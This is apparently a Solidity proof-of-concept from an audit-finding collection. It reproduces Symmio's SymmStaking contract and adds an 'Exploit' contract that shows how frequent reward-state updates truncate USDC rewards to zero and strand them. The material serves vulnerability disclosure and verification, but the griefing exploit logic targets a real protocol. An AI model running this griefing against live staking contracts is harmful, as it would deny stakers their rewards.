// SPDX-License-Identifier: MIT
pragma solidity >=0.8.18;

// ---------------------------------------------------------------------------
// AuditVault #55104 — Symmio "H-1: USDC rewards will not be distributed if
// `_updateRewardsStates` is triggered too often".
//
// This synthetic runs the REAL, unmodified `SymmStaking` audited source
// (token/contracts/staking/SymmStaking.sol @ sherlock-audit/2025-03-symm-io-
// stacking) inside the in-browser EVM. Only the reward/stake tokens are minimal
// real ERC20s (the protocol treats them as opaque SEP-less tokens; SYMM/USDC are
// opaque to the staking math).
//
// The bug: `rewardPerToken` accrues `(elapsed * rate * 1e18) / totalSupply`
// with NO up-scaling for reward tokens that have < 18 decimals. For USDC (6
// decimals) the per-update increment truncates to ZERO whenever a state update
// happens before ~500s of accrual. An attacker keeps `_updateRewardsStates`
// firing (deposit/withdraw/claim/notify) so `perTokenStored` never grows while
// `lastUpdated` keeps advancing — permanently stranding the USDC reward.
//
// The in-browser EVM runs at a single fixed timestamp, so the config seeds
// `rewardState[usdc].lastUpdated` to (now - 498s) — i.e. "the previous griefing
// poke happened 249 blocks (498s) ago". `run()` then executes ONE real griefing
// poke and proves that the 498s of genuinely-accrued USDC is truncated to zero.
// The registry Foundry test drives the full week-long griefing loop with vm.warp.
// ---------------------------------------------------------------------------

import { AccessControlEnumerableUpgradeable } from "@openzeppelin/contracts-upgradeable/access/extensions/AccessControlEnumerableUpgradeable.sol";
import { Initializable } from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import { ReentrancyGuardUpgradeable } from "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";
import { PausableUpgradeable } from "@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title SymmStaking
 * @notice REAL audited source, copied verbatim from
 *         token/contracts/staking/SymmStaking.sol (2025-03-symm-io-stacking).
 */
contract SymmStaking is Initializable, AccessControlEnumerableUpgradeable, ReentrancyGuardUpgradeable, PausableUpgradeable {
	using SafeERC20 for IERC20;

	uint256 public constant DEFAULT_REWARDS_DURATION = 1 weeks;

	bytes32 public constant REWARD_MANAGER_ROLE = keccak256("REWARD_MANAGER_ROLE");
	bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
	bytes32 public constant UNPAUSER_ROLE = keccak256("UNPAUSER_ROLE");

	error ZeroAmount();
	error ZeroAddress();
	error InsufficientBalance(uint256 available, uint256 required);
	error TokenNotWhitelisted(address token);
	error ArraysMismatched();
	error OngoingRewardPeriodForToken(address token, uint256 pendingRewards);
	error TokenWhitelistStatusUnchanged(address token, bool currentStatus);

	event RewardNotified(address[] rewardsTokens, uint256[] rewards);
	event Deposit(address indexed sender, uint256 amount, address indexed receiver);
	event Withdraw(address indexed sender, uint256 amount, address indexed to);
	event RewardClaimed(address indexed user, address indexed rewardsToken, uint256 reward);
	event UpdateWhitelist(address indexed token, bool whitelist);
	event RescueToken(address token, uint256 amount, address receiver);

	struct TokenRewardState {
		uint256 duration;
		uint256 periodFinish;
		uint256 rate;
		uint256 lastUpdated;
		uint256 perTokenStored;
	}

	address public stakingToken;

	uint256 public totalSupply;
	mapping(address => uint256) public balanceOf;

	mapping(address => TokenRewardState) public rewardState;
	address[] public rewardTokens;
	mapping(address => bool) public isRewardToken;

	mapping(address => mapping(address => uint256)) public userRewardPerTokenPaid;
	mapping(address => mapping(address => uint256)) public rewards;

	mapping(address => uint256) public pendingRewards;

	function initialize(address admin, address _stakingToken) external initializer {
		__AccessControlEnumerable_init();
		__ReentrancyGuard_init();
		__Pausable_init();

		if (admin == address(0) || _stakingToken == address(0)) revert ZeroAddress();

		stakingToken = _stakingToken;

		_grantRole(DEFAULT_ADMIN_ROLE, admin);
		_grantRole(REWARD_MANAGER_ROLE, admin);
		_grantRole(PAUSER_ROLE, admin);
		_grantRole(UNPAUSER_ROLE, admin);
	}

	function rewardTokensCount() external view returns (uint256) {
		return rewardTokens.length;
	}

	function lastTimeRewardApplicable(address _rewardsToken) public view returns (uint256) {
		return block.timestamp < rewardState[_rewardsToken].periodFinish ? block.timestamp : rewardState[_rewardsToken].periodFinish;
	}

	function rewardPerToken(address _rewardsToken) public view returns (uint256) {
		if (totalSupply == 0) {
			return rewardState[_rewardsToken].perTokenStored;
		}
		return
			rewardState[_rewardsToken].perTokenStored +
			(((lastTimeRewardApplicable(_rewardsToken) - rewardState[_rewardsToken].lastUpdated) * rewardState[_rewardsToken].rate * 1e18) /
				totalSupply);
	}

	function earned(address account, address _rewardsToken) public view returns (uint256) {
		return
			((balanceOf[account] * (rewardPerToken(_rewardsToken) - userRewardPerTokenPaid[account][_rewardsToken])) / 1e18) +
			rewards[account][_rewardsToken];
	}

	function getFullPeriodReward(address _rewardsToken) external view returns (uint256) {
		return rewardState[_rewardsToken].rate * rewardState[_rewardsToken].duration;
	}

	function deposit(uint256 amount, address receiver) external nonReentrant whenNotPaused {
		_updateRewardsStates(receiver);

		if (amount == 0) revert ZeroAmount();
		if (receiver == address(0)) revert ZeroAddress();
		IERC20(stakingToken).safeTransferFrom(msg.sender, address(this), amount);
		totalSupply += amount;
		balanceOf[receiver] += amount;
		emit Deposit(msg.sender, amount, receiver);
	}

	function withdraw(uint256 amount, address to) external nonReentrant whenNotPaused {
		_updateRewardsStates(msg.sender);

		if (amount == 0) revert ZeroAmount();
		if (to == address(0)) revert ZeroAddress();
		if (amount > balanceOf[msg.sender]) revert InsufficientBalance(balanceOf[msg.sender], amount);
		IERC20(stakingToken).safeTransfer(to, amount);
		totalSupply -= amount;
		balanceOf[msg.sender] -= amount;
		emit Withdraw(msg.sender, amount, to);
	}

	function claimRewards() external nonReentrant whenNotPaused {
		_updateRewardsStates(msg.sender);
		_claimRewardsFor(msg.sender);
	}

	function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) external nonReentrant whenNotPaused {
		_updateRewardsStates(address(0));
		if (tokens.length != amounts.length) revert ArraysMismatched();

		uint256 len = tokens.length;
		for (uint256 i = 0; i < len; i++) {
			address token = tokens[i];
			uint256 amount = amounts[i];

			if (amount == 0) continue;
			if (!isRewardToken[token]) revert TokenNotWhitelisted(token);

			IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
			pendingRewards[token] += amount;
			_addRewardsForToken(token, amount);
		}
		emit RewardNotified(tokens, amounts);
	}

	function claimFor(address user) external nonReentrant onlyRole(REWARD_MANAGER_ROLE) whenNotPaused {
		_updateRewardsStates(user);
		_claimRewardsFor(user);
	}

	function configureRewardToken(address token, bool status) external onlyRole(REWARD_MANAGER_ROLE) {
		_updateRewardsStates(address(0));

		if (token == address(0)) revert ZeroAddress();
		if (isRewardToken[token] == status) revert TokenWhitelistStatusUnchanged(token, status);

		isRewardToken[token] = status;
		if (!status) {
			if (pendingRewards[token] > 10) revert OngoingRewardPeriodForToken(token, pendingRewards[token]);
			uint256 len = rewardTokens.length;
			for (uint256 i = 0; i < len; i++) {
				if (rewardTokens[i] == token) {
					rewardTokens[i] = rewardTokens[rewardTokens.length - 1];
					rewardTokens.pop();
					break;
				}
			}
		} else {
			rewardTokens.push(token);
			rewardState[token].duration = DEFAULT_REWARDS_DURATION;
		}

		emit UpdateWhitelist(token, status);
	}

	function rescueTokens(address token, uint256 amount, address receiver) external nonReentrant onlyRole(DEFAULT_ADMIN_ROLE) {
		IERC20(token).safeTransfer(receiver, amount);
		emit RescueToken(token, amount, receiver);
	}

	function pause() external onlyRole(PAUSER_ROLE) {
		_pause();
	}

	function unpause() external onlyRole(UNPAUSER_ROLE) {
		_unpause();
	}

	function _addRewardsForToken(address token, uint256 amount) internal {
		TokenRewardState storage state = rewardState[token];

		if (block.timestamp >= state.periodFinish) {
			state.rate = amount / state.duration;
		} else {
			uint256 remaining = state.periodFinish - block.timestamp;
			uint256 leftover = remaining * state.rate;
			state.rate = (amount + leftover) / state.duration;
		}

		state.lastUpdated = block.timestamp;
		state.periodFinish = block.timestamp + state.duration;
	}

	function _claimRewardsFor(address user) internal {
		uint256 length = rewardTokens.length;
		for (uint256 i = 0; i < length; ) {
			address token = rewardTokens[i];
			uint256 reward = rewards[user][token];
			if (reward > 0) {
				rewards[user][token] = 0;
				pendingRewards[token] -= reward;
				IERC20(token).safeTransfer(user, reward);
				emit RewardClaimed(user, token, reward);
			}
			unchecked {
				++i;
			}
		}
	}

	function _updateRewardsStates(address account) internal {
		uint256 length = rewardTokens.length;
		for (uint256 i = 0; i < length; ) {
			address token = rewardTokens[i];
			TokenRewardState storage state = rewardState[token];

			state.perTokenStored = rewardPerToken(token); // @> VULN: low-decimal reward increment truncates to 0, but lastUpdated still advances below.
			state.lastUpdated = lastTimeRewardApplicable(token);

			if (account != address(0)) {
				rewards[account][token] = earned(account, token);
				userRewardPerTokenPaid[account][token] = state.perTokenStored;
			}
			unchecked {
				++i;
			}
		}
	}
}

/// @notice Minimal real ERC20. The staking protocol treats SYMM/USDC as opaque
/// tokens, so a standards-compliant ERC20 is faithful here (only decimals differ).
contract MockERC20 is IERC20 {
	string public name;
	string public symbol;
	uint8 public immutable decimals;
	uint256 public override totalSupply;
	mapping(address => uint256) public override balanceOf;
	mapping(address => mapping(address => uint256)) public override allowance;

	constructor(string memory n, string memory s, uint8 d) {
		name = n;
		symbol = s;
		decimals = d;
	}

	function mint(address to, uint256 amount) external {
		balanceOf[to] += amount;
		totalSupply += amount;
		emit Transfer(address(0), to, amount);
	}

	function approve(address spender, uint256 amount) external override returns (bool) {
		allowance[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address to, uint256 amount) external override returns (bool) {
		balanceOf[msg.sender] -= amount;
		balanceOf[to] += amount;
		emit Transfer(msg.sender, to, amount);
		return true;
	}

	function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
		uint256 a = allowance[from][msg.sender];
		if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
		balanceOf[from] -= amount;
		balanceOf[to] += amount;
		emit Transfer(from, to, amount);
		return true;
	}
}

/// @notice In-browser exploit driver. Deploys the REAL SymmStaking, funds a
/// victim stake + a USDC reward, then executes ONE real griefing poke and proves
/// the 498s of genuinely-accrued USDC is truncated to zero for the victim.
contract Exploit {
	SymmStaking public staking;
	MockERC20 public symm;
	MockERC20 public usdc;

	address public constant VICTIM = address(0xA11CE);
	uint256 public constant STAKE = 1_000_000e18;      // 1,000,000 SYMM staked
	uint256 public constant REWARD = 1_209_600_000;    // 1,209.6 USDC over 1 week

	uint256 public accruedButLost;   // real USDC-wei that accrued yet got truncated to 0
	uint256 public victimEarned;     // victim's earned USDC after the griefing poke
	bool public proven;

	constructor() {
		symm = new MockERC20("SYMM", "SYMM", 18);         // nonce 1
		usdc = new MockERC20("USD Coin", "USDC", 6);      // nonce 2
		staking = new SymmStaking();                      // nonce 3
		staking.initialize(address(this), address(symm)); // this = admin / reward manager
		staking.configureRewardToken(address(usdc), true);

		// Fund this contract with SYMM: STAKE for the victim + 1 wei for the poke.
		symm.mint(address(this), STAKE + 1);
		symm.approve(address(staking), type(uint256).max);
		// Stake on the victim's behalf (deposit pulls from msg.sender, credits receiver).
		staking.deposit(STAKE, VICTIM);

		// Notify a real 1,209.6 USDC reward for the week => rate = 2000 usdc-wei/sec.
		usdc.mint(address(this), REWARD);
		usdc.approve(address(staking), type(uint256).max);
		address[] memory tokens = new address[](1);
		uint256[] memory amounts = new uint256[](1);
		tokens[0] = address(usdc);
		amounts[0] = REWARD;
		staking.notifyRewardAmount(tokens, amounts);
		// After notify: lastUpdated == block.timestamp. The playground config seeds
		// rewardState[usdc].lastUpdated back by 498s (= 249 blocks) before run().
	}

	function run() external {
		// Read the seeded reward state: lastUpdated was moved to (now - 498s).
		(, , uint256 rate, uint256 lastUpdated, ) = staking.rewardState(address(usdc));
		uint256 elapsed = block.timestamp - lastUpdated;
		// Guards against a fake pass: if the seed did not apply, elapsed == 0 and no
		// truncation could be demonstrated. Reverting here fails the whole PoC.
		require(elapsed > 0, "seed not applied: elapsed must be > 0");
		require(rate > 0, "reward rate must be non-zero");

		// USDC that GENUINELY accrued to stakers over `elapsed` seconds.
		accruedButLost = elapsed * rate; // 498 * 2000 = 996000 usdc-wei (~0.996 USDC)
		require(accruedButLost > 0, "expected non-zero accrual");

		// The griefing action: our own deposit triggers _updateRewardsStates, which
		// recomputes perTokenStored via the un-upscaled formula. The increment
		// (498 * 2000 * 1e18) / 1e24 == 0 truncates away, yet lastUpdated jumps to now.
		staking.deposit(1, address(this));

		// Harm proven with numbers:
		require(staking.rewardPerToken(address(usdc)) == 0, "increment should truncate to 0");
		victimEarned = staking.earned(VICTIM, address(usdc));
		require(victimEarned == 0, "victim earned nothing despite real accrual");
		require(staking.pendingRewards(address(usdc)) == REWARD, "full reward stranded in contract");

		proven = true;
	}
}
